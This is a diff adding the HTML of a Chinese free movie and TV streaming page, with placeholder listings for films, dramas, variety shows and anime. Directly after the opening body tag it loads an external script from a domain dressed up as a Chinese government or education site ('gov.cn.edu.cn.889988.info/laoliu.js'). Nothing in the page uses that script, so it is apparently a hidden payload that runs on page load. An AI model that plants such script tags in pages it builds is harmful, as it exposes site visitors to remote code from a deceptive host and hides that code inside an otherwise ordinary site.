@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>优播电影网 - 高清影视在线观看</title>
+<meta name="description" content="优播电影网(youbodianyingwang-h5.github.io)提供最新电影、热播电视剧、综艺、动漫在线高清观看，每日更新，免费畅享。">
+<meta name="keywords" content="优播电影网,电影,电视剧,综艺,动漫,在线观看,youbodianyingwang-h5">
+<style>
+/* ===== 全局重置与基础 ===== */
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background: #0f0f1a;
+    color: #e0e0e0;
+    line-height: 1.6;
+    -webkit-font-smoothing: antialiased;
+}
+a { color: inherit; text-decoration: none; transition: color .2s; }
+img { max-width: 100%; height: auto; display: block; }
+ul { list-style: none; }
+
+/* ===== 布局容器 ===== */
+.wrap { width: 100%; max-width: 1200px; margin: 0 auto; padding: 0 15px; }
+
+/* ===== 顶部导航 ===== */
+.navbar {
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+    border-bottom: 1px solid #0f3460;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    box-shadow: 0 2px 10px rgba(0,0,0,.5);
+}
+.nav-inner {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    height: 60px;
+}
+.logo {
+    font-size: 1.5rem;
+    font-weight: 700;
+    background: linear-gradient(90deg, #e94560, #f9a826);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    letter-spacing: 1px;
+}
+.nav-links {
+    display: flex;
+    gap: 20px;
+}
+.nav-links a {
+    font-size: .95rem;
+    padding: 8px 12px;
+    border-radius: 6px;
+    color: #ccc;
+}
+.nav-links a:hover, .nav-links a.active {
+    background: rgba(233,69,96,.15);
+    color: #e94560;
+}
+.menu-toggle { display: none; }
+
+/* ===== Hero 区域 ===== */
+.hero {
+    background: url('https://images.unsplash.com/photo-1489599849927-2ee91cede3ba?auto=format&fit=crop&w=1350&q=80') center/cover no-repeat;
+    padding: 100px 0;
+    text-align: center;
+    position: relative;
+}
+.hero::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: rgba(15,15,26,.75);
+}
+.hero-content {
+    position: relative;
+    z-index: 1;
+    max-width: 700px;
+    margin: 0 auto;
+}
+.hero h1 {
+    font-size: 2.5rem;
+    margin-bottom: 15px;
+    color: #fff;
+    text-shadow: 0 2px 4px rgba(0,0,0,.5);
+}
+.hero p {
+    font-size: 1.1rem;
+    color: #bbb;
+    margin-bottom: 30px;
+}
+.hero-btn {
+    display: inline-block;
+    padding: 12px 35px;
+    background: linear-gradient(90deg, #e94560, #f9a826);
+    color: #fff;
+    border-radius: 30px;
+    font-weight: 600;
+    box-shadow: 0 4px 15px rgba(233,69,96,.4);
+}
+.hero-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(233,69,96,.6); }
+
+/* ===== 栏目通用 ===== */
+.section { padding: 60px 0; }
+.section-title {
+    text-align: center;
+    font-size: 2rem;
+    margin-bottom: 40px;
+    color: #fff;
+    position: relative;
+}
+.section-title::after {
+    content: '';
+    width: 60px;
+    height: 3px;
+    background: linear-gradient(90deg, #e94560, #f9a826);
+    position: absolute;
+    bottom: -10px;
+    left: 50%;
+    transform: translateX(-50%);
+    border-radius: 2px;
+}
+
+/* ===== 电影栏目 (网格卡片) ===== */
+.movies-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+    gap: 25px;
+}
+.movie-card {
+    background: #1a1a2e;
+    border-radius: 10px;
+    overflow: hidden;
+    transition: transform .3s, box-shadow .3s;
+    cursor: pointer;
+}
+.movie-card:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 8px 25px rgba(0,0,0,.5);
+}
+.movie-poster {
+    width: 100%;
+    height: 260px;
+    background: #2a2a4a;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #666;
+    font-size: .9rem;
+}
+.movie-info { padding: 15px; }
+.movie-title { font-size: 1rem; font-weight: 600; color: #eee; margin-bottom: 5px; }
+.movie-meta { font-size: .8rem; color: #888; }
+
+/* ===== 电视剧栏目 (列表) ===== */
+.tv-list { display: flex; flex-direction: column; gap: 15px; }
+.tv-item {
+    display: flex;
+    background: #16213e;
+    border-radius: 8px;
+    overflow: hidden;
+    transition: background .3s;
+}
+.tv-item:hover { background: #1a1a3e; }
+.tv-thumb {
+    width: 160px;
+    min-height: 100px;
+    background: #2a2a5a;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #666;
+    flex-shrink: 0;
+}
+.tv-detail { padding: 15px; flex: 1; }
+.tv-detail h3 { font-size: 1.1rem; color: #ddd; margin-bottom: 8px; }
+.tv-detail p { font-size: .9rem; color: #999; }
+
+/* ===== 综艺栏目 (水平滚动) ===== */
+.variety-scroll {
+    display: flex;
+    gap: 20px;
+    overflow-x: auto;
+    padding-bottom: 10px;
+    scroll-snap-type: x mandatory;
+}
+.variety-scroll::-webkit-scrollbar { height: 6px; }
+.variety-scroll::-webkit-scrollbar-thumb { background: #e94560; border-radius: 3px; }
+.var-card {
+    min-width: 240px;
+    scroll-snap-align: start;
+    background: #1a1a2e;
+    border-radius: 10px;
+    overflow: hidden;
+}
+.var-banner {
+    height: 120px;
+    background: linear-gradient(45deg, #e94560, #f9a826);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    font-weight: 600;
+    font-size: 1.1rem;
+}
+.var-info { padding: 12px; }
+.var-info h4 { color: #eee; margin-bottom: 5px; }
+.var-info span { font-size: .8rem; color: #888; }
+
+/* ===== 动漫栏目 (特色卡片) ===== */
+.anime-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+    gap: 25px;
+}
+.anime-card {
+    position: relative;
+    border-radius: 12px;
+    overflow: hidden;
+    height: 200px;
+}
+.anime-bg {
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(135deg, #0f3460, #16213e);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    font-size: 1.2rem;
+    font-weight: 600;
+    transition: transform .4s;
+}
+.anime-card:hover .anime-bg { transform: scale(1.05); }
+.anime-overlay {
+    position: absolute;
+    inset: 0;
+    background: rgba(0,0,0,.6);
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-end;
+    padding: 15px;
+    opacity: 0;
+    transition: opacity .3s;
+}
+.anime-card:hover .anime-overlay { opacity: 1; }
+.anime-overlay h4 { color: #fff; margin-bottom: 5px; }
+.anime-overlay p { color: #ccc; font-size: .85rem; }
+
+/* ===== 关于/页脚 ===== */
+.about {
+    background: #16213e;
+    padding: 50px 0;
+    text-align: center;
+}
+.about h2 { color: #fff; margin-bottom: 20px; }
+.about p { max-width: 800px; margin: 0 auto 30px; color: #aaa; }
+.footer {
+    background: #0f0f1a;
+    padding: 20px 0;
+    text-align: center;
+    border-top: 1px solid #1a1a2e;
+    font-size: .85rem;
+    color: #666;
+}
+.footer a { color: #e94560; }
+
+/* ===== 移动端自适应 ===== */
+@media (max-width: 768px) {
+    .nav-links {
+        display: none;
+        position: absolute;
+        top: 60px;
+        left: 0;
+        right: 0;
+        background: #1a1a2e;
+        flex-direction: column;
+        padding: 20px 0;
+        border-bottom: 1px solid #0f3460;
+    }
+    .nav-links.show { display: flex; }
+    .nav-links a { padding: 12px 20px; }
+    .menu-toggle {
+        display: block;
+        background: none;
+        border: none;
+        color: #fff;
+        font-size: 1.5rem;
+        cursor: pointer;
+    }
+    .hero { padding: 60px 0; }
+    .hero h1 { font-size: 1.8rem; }
+    .hero p { font-size: 1rem; }
+    .section { padding: 40px 0; }
+    .section-title { font-size: 1.5rem; }
+    .movies-grid { grid-template-columns: repeat(2, 1fr); gap: 15px; }
+    .movie-poster { height: 200px; }
+    .tv-item { flex-direction: column; }
+    .tv-thumb { width: 100%; height: 140px; }
+    .variety-scroll { gap: 15px; }
+    .var-card { min-width: 200px; }
+    .anime-grid { grid-template-columns: 1fr; }
+}
+@media (max-width: 480px) {
+    .hero h1 { font-size: 1.5rem; }
+    .movies-grid { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 顶部导航 -->
+<nav class="navbar">
+    <div class="wrap nav-inner">
+        <div class="logo">优播电影网</div>
+        <button class="menu-toggle" onclick="toggleMenu()">☰</button>
+        <div class="nav-links" id="navLinks">
+            <a href="#movies" class="active">电影</a>
+            <a href="#tv">电视剧</a>
+            <a href="#variety">综艺</a>
+            <a href="#anime">动漫</a>
+            <a href="#about">关于</a>
+        </div>
+    </div>
+</nav>
+
+<!-- Hero -->
+<header class="hero">
+    <div class="wrap hero-content">
+        <h1>优播电影网</h1>
+        <p>最新电影、热播剧集、综艺动漫，每日更新，高清免费观看</p>
+        <a href="#movies" class="hero-btn">立即观看</a>
+    </div>
+</header>
+
+<!-- 电影栏目 -->
+<section class="section" id="movies">
+    <div class="wrap">
+        <h2 class="section-title">最新电影</h2>
+        <div class="movies-grid">
+            <div class="movie-card">
+                <div class="movie-poster">海报占位</div>
+                <div class="movie-info">
+                    <div class="movie-title">电影标题一</div>
+                    <div class="movie-meta">2024 · 动作 · 8.5分</div>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">海报占位</div>
+                <div class="movie-info">
+                    <div class="movie-title">电影标题二</div>
+                    <div class="movie-meta">2024 · 喜剧 · 7.9分</div>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">海报占位</div>
+                <div class="movie-info">
+                    <div class="movie-title">电影标题三</div>
+                    <div class="movie-meta">2023 · 科幻 · 8.2分</div>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">海报占位</div>
+                <div class="movie-info">
+                    <div class="movie-title">电影标题四</div>
+                    <div class="movie-meta">2023 · 悬疑 · 8.8分</div>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">海报占位</div>
+                <div class="movie-info">
+                    <div class="movie-title">电影标题五</div>
+                    <div class="movie-meta">2024 · 爱情 · 7.5分</div>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">海报占位</div>
+                <div class="movie-info">
+                    <div class="movie-title">电影标题六</div>
+                    <div class="movie-meta">2024 · 动画 · 8.0分</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 电视剧栏目 -->
+<section class="section" id="tv" style="background:#0a0a14;">
+    <div class="wrap">
+        <h2 class="section-title">热播电视剧</h2>
+        <div class="tv-list">
+            <div class="tv-item">
+                <div class="tv-thumb">剧照</div>
+                <div class="tv-detail">
+                    <h3>电视剧名称一</h3>
+                    <p>都市情感剧，讲述现代职场与爱情的故事，全32集。</p>
+                </div>
+            </div>
+            <div class="tv-item">
+                <div class="tv-thumb">剧照</div>
+                <div class="tv-detail">
+                    <h3>电视剧名称二</h3>
+                    <p>古装悬疑剧，探案推理，剧情紧凑，好评如潮。</p>
+                </div>
+            </div>
+            <div class="tv-item">
+                <div class="tv-thumb">剧照</div>
+                <div class="tv-detail">
+                    <h3>电视剧名称三</h3>
+                    <p>现代刑侦剧，真实案件改编，扣人心弦。</p>
+                </div>
+            </div>
+            <div class="tv-item">
+                <div class="tv-thumb">剧照</div>
+                <div class="tv-detail">
+                    <h3>电视剧名称四</h3>
+                    <p>历史传奇剧，宏大叙事，制作精良。</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 综艺栏目 -->
+<section class="section" id="variety">
+    <div class="wrap">
+        <h2 class="section-title">热门综艺</h2>
+        <div class="variety-scroll">
+            <div class="var-card">
+                <div class="var-banner">综艺一</div>
+                <div class="var-info">
+                    <h4>综艺节目一</h4>
+                    <span>更新至第12期</span>
+                </div>
+            </div>
+            <div class="var-card">
+                <div class="var-banner">综艺二</div>
+                <div class="var-info">
+                    <h4>综艺节目二</h4>
+                    <span>更新至第8期</span>
+                </div>
+            </div>
+            <div class="var-card">
+                <div class="var-banner">综艺三</div>
+                <div class="var-info">
+                    <h4>综艺节目三</h4>
+                    <span>更新至第10期</span>
+                </div>
+            </div>
+            <div class="var-card">
+                <div class="var-banner">综艺四</div>
+                <div class="var-info">
+                    <h4>综艺节目四</h4>
+                    <span>更新至第6期</span>
+                </div>
+            </div>
+            <div class="var-card">
+                <div class="var-banner">综艺五</div>
+                <div class="var-info">
+                    <h4>综艺节目五</h4>
+                    <span>更新至第4期</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 动漫栏目 -->
+<section class="section" id="anime" style="background:#0a0a14;">
+    <div class="wrap">
+        <h2 class="section-title">动漫推荐</h2>
+        <div class="anime-grid">
+            <div class="anime-card">
+                <div class="anime-bg">动漫一</div>
+                <div class="anime-overlay">
+                    <h4>动漫标题一</h4>
+                    <p>热血冒险，持续更新中</p>
+                </div>
+            </div>
+            <div class="anime-card">
+                <div class="anime-bg">动漫二</div>
+                <div class="anime-overlay">
+                    <h4>动漫标题二</h4>
+                    <p>奇幻魔法，全26集</p>
+                </div>
+            </div>
+            <div class="anime-card">
+                <div class="anime-bg">动漫三</div>
+                <div class="anime-overlay">
+                    <h4>动漫标题三</h4>
+                    <p>科幻机甲，剧场版</p>
+                </div>
+            </div>
+            <div class="anime-card">
+                <div class="anime-bg">动漫四</div>
+                <div class="anime-overlay">
+                    <h4>动漫标题四</h4>
+                    <p>治愈日常，全12集</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 关于 -->
+<section class="about" id="about">
+    <div class="wrap">
+        <h2>关于 优播电影网</h2>
+        <p>
+            优播电影网(youbodianyingwang-h5.github.io)是一个专注于影视资源分享的在线平台，
+            提供电影、电视剧、综艺、动漫等各类高清视频的在线观看服务。
+            我们致力于为用户打造极致的观影体验，每日更新最新内容，完全免费。
+        </p>
+        <p style="color:#888; font-size:.9rem;">
+            本站网址：<a href="https://youbodianyingwang-h5.github.io">https://youbodianyingwang-h5.github.io</a>
+        </p>
+    </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="footer">
+    <div class="wrap">
+        <p>© 2024 优播电影网(youbodianyingwang-h5.github.io) 保留所有权利</p>
+        <p style="margin-top:10px;">网站名称：优播电影网 | 关键词：优播电影网,电影,电视剧,综艺,动漫</p>
+    </div>
+</footer>
+
+<script>
+function toggleMenu() {
+    var nav = document.getElementById('navLinks');
+    nav.classList.toggle('show');
+}
+// 平滑滚动
+document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+    anchor.addEventListener('click', function (e) {
+        e.preventDefault();
+        var target = document.querySelector(this.getAttribute('href'));
+        if (target) {
+            target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }
+        // 移动端点击后关闭菜单
+        if (window.innerWidth <= 768) {
+            document.getElementById('navLinks').classList.remove('show');
+        }
+    });
+});
+</script>
+
+</body>
+</html>
